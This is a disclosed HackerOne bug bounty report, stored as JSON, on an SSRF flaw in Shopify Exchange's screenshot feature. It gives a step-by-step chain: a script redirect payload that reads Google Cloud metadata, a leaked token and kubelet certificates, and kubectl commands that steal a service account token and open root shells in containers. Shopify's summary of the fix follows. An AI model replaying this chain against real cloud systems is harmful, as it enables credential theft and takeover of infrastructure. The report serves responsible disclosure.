{
  "id": 341876,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE4NzY=",
  "url": "https://hackerone.com/reports/341876",
  "title": "SSRF in Exchange leads to ROOT access in all instances",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-04-22T23:39:53.445Z",
  "submitted_at": "2018-04-22T23:39:53.445Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "0xacb",
    "url": "/0xacb",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/hgbi683nnn5y6d0kxto7a9unt4fk/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-05-23T21:09:28.855Z",
  "bug_reporter_agreed_on_going_public_at": "2018-05-23T21:09:28.755Z",
  "team_member_agreed_on_going_public_at": "2018-05-23T20:59:54.217Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## The Exploit Chain - How to get root access on all Shopify instances\n\n### 1 - Access Google Cloud Metadata\n- 1: Create a store (partners.shopify.com)\n- 2: Edit the template `password.liquid` and add the following content:\n\n```html\n<script>\nwindow.location=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\";\n// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.\n</script>\n```\n\n- 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app\n- 4: Wait for the store screenshot to appear on the Create Listing page\n- 5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)\n\n{F289082}\n\nExploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to \"bypass\" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.\n\nI tried to leak more data, but the web screenshot software wasn't producing any images for `application/text` responses. However, I found that I could add the parameter `alt=json` to force `application/json` responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (`█████`), the instance name and more:\n\n```html\n<script>\nwindow.location=\"http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\";\n</script>\n```\n{F289081}\n\n**Can I add my SSH key using the leaked token? No**\n\n```bash\ncurl -X POST \"https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata\" -H \"Authorization: Bearer ██████████████\" -H \"Content-Type: application/json\" --data '{\"items\": [{\"key\": \"0xACB\", \"value\": \"test\"}]}'\n```\n```json\n{\n \"error\": {\n  \"errors\": [\n   {\n    \"domain\": \"global\",\n    \"reason\": \"forbidden\",\n    \"message\": \"Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'\"\n   },\n   {\n    \"domain\": \"global\",\n    \"reason\": \"forbidden\",\n    \"message\": \"Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'\"\n   }\n  ],\n  \"code\": 403,\n  \"message\": \"Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'\"\n }\n}\n```\n\nI checked the scopes for this token and there was no read/write access to the Compute Engine API:\n```bash\ncurl \"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████\"\n```\n```json\n{\n \"issued_to\": \"███████\",\n \"audience\": \"███\",\n \"scope\": \"https://www.googleapis.com/auth/cloud-platform\",\n \"expires_in\": 1307,\n \"access_type\": \"offline\"\n}\n```\n\n### 2 - Dumping kube-env\n\nI created a new store and pulled attributes from this instance recursively: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json\n\nResult:\n{F289455}\n\n**Metadata concealment** (https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment) is not enabled, so the `kube-env` attribute is available.\n\nSince the image is cropped, I made a new request to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json in order to see the rest of the Kubelet certificate and the Kubelet private key.\n\nResult:\n{F289456}\n\n**ca.crt**\n```\n-----BEGIN CERTIFICATE-----\n██████\n███████\n███████\n████████\n██████████████\n████████\n████████\n███████\n████\n██████\n███\n█████████\n████\n████\n████████\n███████\n███\n-----END CERTIFICATE-----\n```\r\n\n**client.crt**\n```\n-----BEGIN CERTIFICATE-----\n█████\n███████\n██████\n████████\n██████████\n█████\n██████\n█████\n█████\n██████████\n███████\n█████\n████\n████\n████████\n████████\n-----END CERTIFICATE-----\n```\n\n**client.pem**\n```\n-----BEGIN RSA PRIVATE KEY-----\n█████████\n██████\n████████\n████\n████\n█████████\n██████████\n██████\n████████\n█████████\n██████\n██████████\n███\n██████████\n███\n██████\n█████████\n████████\n██████████\n█████████\n████\n████\n████████\n████\n███████\n-----END RSA PRIVATE KEY-----\n```\n\n**MASTER_NAME**: █████\n\n### 3 - Using Kubelet to execute arbitrary commands\n\nIt's possible to list all pods {F289460}:\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces\n\nNAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE\n████████                    ██████████                    1/1    \n```\n\nAnd create new pods as well:\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml\n\npod \"shell-demo\" created\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo\n\npod \"shell-demo\" deleted\n```\n\nI didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user `████████`. However, it's not possible to execute commands in this new pod or any other pod:\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash\n\nError from server (Forbidden): pods \"shell-demo\" is forbidden: User \"███\" cannot create pods/exec in the namespace \"default\": Unknown user \"███\"\n```\r\n\nThe `get secrets` command doesn't work, but it's possible to describe a given pod and the get the secret using its name. That's how I leaked the kubernetes.io service account token using the instance `████` from the namespace `████`:\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████\n\nName:           ████████\nNamespace:      ██████\nNode:           ██████████\nStart Time:     Fri, 23 Mar 2018 13:53:13 +0000\nLabels:         █████\n                ████\n                █████\nAnnotations:    <none>\nStatus:         Running\nIP:             █████████\nControlled By:  █████\nContainers:\n  default-http-backend:\n    Container ID:   docker://███\n    Image:          ██████\n    Image ID:       docker-pullable://█████\n    Port:           ████/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Sun, 22 Apr 2018 03:23:09 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    2\n      Started:      Fri, 20 Apr 2018 23:39:21 +0000\n      Finished:     Sun, 22 Apr 2018 03:23:07 +0000\n    Ready:          True\n    Restart Count:  180\n    Limits:\n      cpu:     10m\n      memory:  20Mi\n    Requests:\n      cpu:        10m\n      memory:     20Mi\n    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3\n    Environment:  <none>\n    Mounts:\n      ██████\nConditions:\n  Type           Status\n  Initialized    True\n  Ready          True\n  PodScheduled   True\nVolumes:\n ██████████:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName: ███████\n    Optional:    false\nQoS Class:       Guaranteed\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:          <none>\n```\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml\n\napiVersion: v1\ndata:\n  ca.crt: ██████████\n  namespace: ████\n  token: ██████████==\nkind: Secret\nmetadata:\n  annotations:\n    kubernetes.io/service-account.name: default\n    kubernetes.io/service-account.uid: ████\n  creationTimestamp: 2017-01-23T16:08:19Z\n  name:█████\n  namespace: ██████████\n  resourceVersion: \"115481155\"\n  selfLink: /api/v1/namespaces/████████/secrets/████\n  uid: █████████\ntype: kubernetes.io/service-account-token\n```\n\nAnd finally, it's possible to use this token to get a shell in any container:\n```bash\n$ kubectl --certificate-authority ca.crt --server https://████ --token \"█████.██████.███\" exec -it w█████████ -- /bin/bash\n\nDefaulting container name to web.\nUse 'kubectl describe pod/w█████████' to see all of the containers in this pod.\n███████:/# id\nuid=0(root) gid=0(root) groups=0(root)\n█████:/# ls\napp  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\n███████:/# exit\n```\n\n```bash\n$ kubectl --certificate-authority ca.crt --server https://███████ --token \"█████.██████.█████████\" exec -it ████████ -n ████████ -- /bin/bash\n\nDefaulting container name to web.\nUse 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod.\nroot@████:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@████:/# ls\napp  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\nroot@█████:/# exit\n```\n\n---\n*Huge thanks to [Luís Maia](https://www.linkedin.com/in/luis-maia-7714023a) [0xfad0](http://hackerone.com/0xfad0), for helping me build this █████*\n\n## Impact\n\n**CRITICAL**\n\nThe hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Can internal services be reached bypassing network access control?**\nYes\n\n**What internal services were accessible?**\nGoogle Cloud Metadata\n\n**Security Impact**\nRCE\n\n",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 531,
  "voters": [
    "act1on3",
    "cxzer0",
    "th3hidd3nmist",
    "porcupineyhairs",
    "time4ster",
    "omarelfarsaoui",
    "xdms",
    "proviesec",
    "0xflik",
    "tokyoenigma",
    "and 521 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 37450,
    "asset_type": "URL",
    "asset_identifier": "exchangemarketplace.com",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 7516,
      "category": "team",
      "content": "Shopify infrastructure is isolated into subsets of infrastructure. @0xacb reported it was possible to gain root access to any container in one particular subset by exploiting a server side request forgery bug in the screenshotting functionality of Shopify Exchange. Within an hour of receiving the report, we disabled the vulnerable service, began auditing applications in all subsets and remediating across all our infrastructure. The vulnerable subset did not include Shopify core.\n\nAfter auditing all services, we fixed the bug by deploying a metadata concealment proxy to disable access to metadata information. We also disabled access to internal IPs on all infrastructure subsets. We awarded this $25,000 as a Shopify Core RCE since some applications in this subset do have access to some Shopify core data and systems.",
      "user": {
        "id": 19168,
        "username": "francoischagnon",
        "name": "Francois Chagnon",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "",
        "location": "",
        "created_at": "2015-03-19T21:06:55.673Z",
        "url": "https://hackerone.com/francoischagnon",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
